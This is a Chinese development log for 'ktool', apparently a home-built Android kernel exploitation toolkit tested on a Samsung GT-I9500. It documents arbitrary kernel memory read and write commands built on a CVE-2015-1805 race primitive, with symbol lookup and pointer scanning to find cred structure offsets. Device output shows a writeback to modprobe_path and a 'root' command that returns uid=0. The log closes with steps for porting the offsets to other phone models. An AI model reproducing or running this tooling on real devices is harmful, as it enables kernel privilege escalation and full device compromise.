## 一、这一步解决什么

P4.82 列的 P0/P1 里，有三条是"工具形态"问题，不是漏洞问题：

| 缺口 | 之前 | 现在 |
|---|---|---|
| P0-4 符号解析只在模块里 | 想知道 `c0064538` 是什么函数，得 insmod + `ksym`，或回 PC 查 kallsyms.txt | `ktool sym c0064538` |
| P1-5 没有二进制落盘 | `dump` 只 hex 刷屏、上限 4096 | `kread_file` / `kwrite_file`，任意长度 |
| P1-6 没有内存搜索 | 只能按已知地址读，不能"喷了图案再找" | `scan`（字节串）+ `scan4`（指针/范围） |

三条都不碰漏洞利用逻辑，纯工具层；但缺了它们，S5/S6 上做结构分析基本没法推进。

## 二、三条命令

### 1. `sym` —— 离线符号表

```
ktool sym <name>              名字 → 地址（多个同名全列）
ktool sym '<glob>' -n 40      通配：*wake_up* / rt_mutex*
ktool sym 0xc0064538          地址 → 符号+偏移（nearest <= addr，并给出下一个符号）
ktool sym name -a             强制按地址解释
ktool sym ... -f /path/map    指定表文件
```

查表顺序：`$KTOOL_MAP` → `/data/local/tmp/System.map` →
`/data/local/tmp/kallsyms.txt` → `./System.map` → `./kallsyms.txt` → `/sdcard/*`。

**两种格式都吃**：

```
c0008000 T _stext       标准 System.map（地址 类型 名字）
c0008000 T_stext        kallsyms_extract.py 的产物（类型粘在名字前）
```

后者是 ARM 3.x `kallsyms_expand_symbol()` 的行为——它跳过名字首字节（类型），
我们当时的提取脚本把这个字节也写进名字了，所以文件里是 `Tcommit_creds`。
解析器对两段式取首字符当类型，并且**剪掉行尾 `\r`**（Windows 生成的表是 CRLF，
第一版没剪，`sym commit_creds` 直接 no match）。

> 为什么不做"运行时读内核 kallsyms"：63133 条名字是压缩存储，靠 2000B/次、
> 约 1/3 成功率的读原语去解压，代价远超 push 一个 2MB 文本文件。

### 2. `kread_file` / `kwrite_file` —— 大块 IO

```
ktool kread_file <hexaddr> <len> <outfile>
ktool kwrite_file <infile> <hexaddr>
```

内部分块，把 backend 的单次上限（读 2000 / 写 4000）藏起来：

- `kread_raw`：len 必须 8 对齐，按 `max_read` 切块；
- `kread_buf`：len 任意，尾块多读的 ≤7 字节落到 2KB bounce 里丢弃，
  **不越界写调用方缓冲区**；
- `kwrite_buf`：len 任意；尾块"读 8 字节原值 → 拼接 → 整块写回"（RMW），
  只有目标那 n 个字节变化，不会把后面 8-n 字节清成垃圾；
- 每块写后都 `kread_raw` 回读比对（30 次重试），失败立刻返回，
  并提示"可能已写了一半，先用 kread_file 核对"。

### 3. `scan` —— 内核内存模式搜索

```
ktool scan <hexstart> <len> <pattern> [maxhits]
```

- pattern：`s:swapper`（ASCII）或 `9e 37 79 b9` / `0x9e3779b9` / `73:77:61:70`（hex 字节）；
- 窗口 32KB，窗口间保留 `patlen-1` 重叠，跨窗口的模式不会漏；
- 读失败（未映射）跳 4096 继续，连续失败 64 次才放弃；
- 命中打印 16 字节 hex + ASCII。

### 4. `scan4` —— 指针搜索（P4.84）

```
ktool scan4 <hexstart> <len> <value|lo-hi> [max] [-u]
```

- `value`：单个 32 位值，回答"**谁存着这个指针**"；
- `lo-hi`：范围，如 `0xc0008000-0xd0000000`，回答"**这个结构里有哪些内核指针**"；
- `-u`：连非 4 对齐偏移一起报（默认只报对齐，噪声小一个量级）；
- 窗口 32KB、重叠 3 字节（4 字节字可能跨窗），对齐按**绝对地址**判，不受窗口偏移影响；
- 每个命中的**值**会去符号表反查并标注（如 `Dinit_cred+0x0`）。
  刻意标值不标地址：命中地址一般在 slab 里，符号表里根本没有；
  值往往指向内核镜像里的对象，一标就懂。
  若值与符号的差值 > 1MB（说明那个值只是个碰巧落进范围内的数），不标，
  免得印出 `_end+0x3ad340d` 这种假命中。

## 三、真机实测（GT-I9500 / 3.4.5-6264821）

### sym

```
$ ktool sym commit_creds
0xc005af14 T commit_creds

$ ktool sym init_task
0xc0b79be0 D init_task                     ← 与 targets.h 的 [A] 地址一致

$ ktool sym c0064538
(没有叫 "c0064538" 的符号，按地址反查)
0xc0064538 = ttry_to_wake_up+0x110  (base 0xc0064428, next 0xc006470c Twake_up_process, span 0x2e4)
```

第三条是关键交叉验证：**P4.51 dmesg 里 GhostLock 的 LR 就是 c0064538**，
当时是回 PC 手工查表得出的 `try_to_wake_up+0x110`；现在设备上一条命令直接给出，
且 `next` 符号边界（0xc006470c）说明这个函数只有 0x2e4 字节，偏移 0x110 落在函数体内。

通配：`*wake_up*` 36 个、`rt_mutex*` 16 个，列表与 kallsyms.txt 顺序一致。

### kread_file

```
$ ktool kread_file 0xc0b79be0 0x400 /data/local/tmp/init_task.bin
wrote 1024 bytes: 0xc0b79be0..0xc0b79fdf
```
拉回 PC 解析：
```
comm@0x304   = b'swapper/0'          ← 与 targets.h off_task_comm=0x304 吻合
tasks.next@0x1d0 = 0xe68481d0        ← 堆上 task_struct，符合 3.4 的 kmalloc 区
tasks.prev@0x1d4 = 0xccaf8610
```

12KB 跨 7 块再读一次，与上面 1KB 的前 1024 字节比对：**只有 5 字节不同**——
`0x1d5..0x1d7`（tasks.prev 中间字节，进程链表实时变化）和 `0x2b0..0x2b1`（调度计数）。
不是读错，是结构本身在动。这条比"完全一致"更有说服力：说明分块边界没有错位。

### kwrite_file（零增量写入）

拿 `modprobe_path`（0xc0b9ec3c，本来就是我们的暂存区）做**写回原值**测试，
长度故意取 60（非 8 的倍数）以触发 RMW 尾块：

```
$ ktool kwrite_file mp60.bin 0xc0b9ec3c
write 60 bytes -> 0xc0b9ec3c (分块 <=4000，尾块 RMW，逐块校验)
OK
$ ktool kread_file 0xc0b9ec3c 64 mp64b.bin
```
比对：前 60 字节 = `/sbin/modprobe` + 全 0，与写前完全一致，第 61..64 字节（被 RMW
读进去又写回的那 4 字节）也没有变。**净变化为零**，写路径正确且不污染邻居。

### scan

```
$ ktool scan 0xc0b79000 0x2000 s:swapper
0xc0b79ee4: 73 77 61 70 70 65 72  |swapper|
hits: 1
```
`0xc0b79ee4 - 0xc0b79be0 = 0x304` —— 正好是 `off_task_comm`。
即：**只给一个范围内存，就能把 init_task 的 comm 位置反推出来**，这正是换机型
标定偏移需要的能力。

跨窗口（64KB，两个 32KB 窗口）同址命中，重叠逻辑有效。

### scan4（换机型标定的完整演示）

目标：**只用两个符号**（`init_task`、`init_cred`）把 `off_task_real_cred` /
`off_task_cred` 反推出来，不靠任何硬编码偏移。

```
$ ktool sym init_task      → 0xc0b79be0 D init_task
$ ktool sym init_cred      → 0xc0b9f1dc D init_cred

$ ktool scan4 0xc0b79be0 0x400 0xc0b9f1dc
0xc0b79ed8: 0xc0b9f1dc  Dinit_cred+0x0
0xc0b79edc: 0xc0b9f1dc  Dinit_cred+0x0
hits: 2
```

`0xc0b79ed8 - 0xc0b79be0 = 0x2f8`，`0xc0b79edc - 0xc0b79be0 = 0x2fc` ——
与 `targets.h` 里记的 `off_task_real_cred=0x2f8 / off_task_cred=0x2fc` **完全一致**。
只有两个命中（`real_cred` 和 `cred` 相邻），没有噪声。

再验证这把指针对不对：`dump 0xc0b9f1dc 48` → `06000000` 之后 11 个字全 0，
即 `usage=6, uid=gid=...=0`，是初始 cred 的形状，不是野指针。

范围模式在同一块内存上给出更完整的结构图（`0xc0008000-0xd0000000`，对齐）：

```
0xc0b79dc0: 0xc0b79dbc  Dinit_task+0x1dc     ← 自指链表头
0xc0b79dd4: 0xc0b79dd4  Dinit_task+0x1f4
0xc0b79e40: 0xc0b9ef90  Dinit_struct_pid+0x0
0xc0b79ed8: 0xc0b9f1dc  Dinit_cred+0x0
```

每个 `X: X` 形式（值等于自身地址）都是空链表头，一眼就能数出结构里有几个 list。
这比"读一串 hex 再猜"快一个数量级。

`-u` 模式：同一块内存立刻多出 0xc4c0b79d 这类非对齐"值"，
说明只该在确认结构没对齐时才开。

### 回归

| 命令 | 结果 |
|---|---|
| `target` | 正常列出 GT-I9500 |
| `backend probe` | `probe(init_task=0xc0b79be0): OK` |
| `dump 0xc0b79be0 32` | 与 kread_file 前 32 字节一致 |
| `root /system/bin/id` | 3 次中 2 次成功 → `uid=0(root)`，context 仍 `u:r:shell:s0`（已知） |

`root` 那次失败是 1805 竞态固有的（约 1/3 失败），不是新代码回归——
同一二进制紧接着重跑就成功。

## 四、工具链变更（顺带修的坑）

原注释写的是 `zig cc -target arm-linux-musleabi`，但**本机已经没有 zig**
（`.comment` 里是 `clang version 21.1.0 / LLD 21.1.0`，zig 内置的 clang）。
现在改用 `toolchain/arm-gnu-toolchain-13.3.rel1` 的 `arm-none-linux-gnueabihf-gcc -static`：

```
sh build.sh [输出名]     # 默认 ktool
```

- 产物 443,508 B（strip 后），**比 zig 版 1.4MB 还小**；
- 纯静态 ELF，Android 侧不经 linker，直接 exec；
- glibc 静态在 3.4 内核上跑 1805 竞态、pthread、`writev/readv` 全部正常（上表回归为证）。

设备侧：旧的 zig 版留在 `/data/local/tmp/ktool_old` 以备回滚。

## 五、换机型怎么用（S5/S6 待验证）

1. 从该机镜像提取 kallsyms，生成 `kallsyms.txt`（S4 用的是
   `kallsyms_extract.py`，锚点法：addresses / num_syms / names / markers / token 表）；
2. `adb push kallsyms.txt /data/local/tmp/System.map`；
3. `ktool sym init_task / modprobe_path / selinux_state / ...` 直接拿到 [A] 类地址，
   不再需要模块 `ksym`、也不需要 insmod；
4. `ktool scan` 在 `init_task` 附近反推 `off_task_comm` 等 [B] 类偏移。

前提仍然是**该机有一个能跑的读原语**（backend）。S4 是 1805；S5 的 1805 已修
（`pipe_iov_copy_from_user` 5 参，P4.78），所以 S5 还缺一个 backend——这一步没有改变。

## 六、没做的

- **targets.h 自动生成器**：`sym` 已能给出地址，但"从 kallsyms.txt 直接生成
  一条 targets.h 记录"的脚本还没写（要处理 `permissive_map` 这类结构体内地址，
  它不在符号表里，仍需反汇编推）。这是 P4.82 §三-2 的另一半。
- **scan 的语义搜索**：现在能按字节串（scan）和按 32 位值/范围（scan4）找，
  但"找所有 cred 形状的对象""找所有指向 X 的二级指针"这类多条件搜索没做。
- **断点续传**：`kread_file` 中途失败会留下半截文件（已提示），没有 `--resume`。
- **标定脚本**：`scan4` 已经能手工完成"符号 → 偏移"的推导，但没有脚本把
  `ktool sym` + `scan4` 串成一条命令直接输出 `targets.h` 片段。
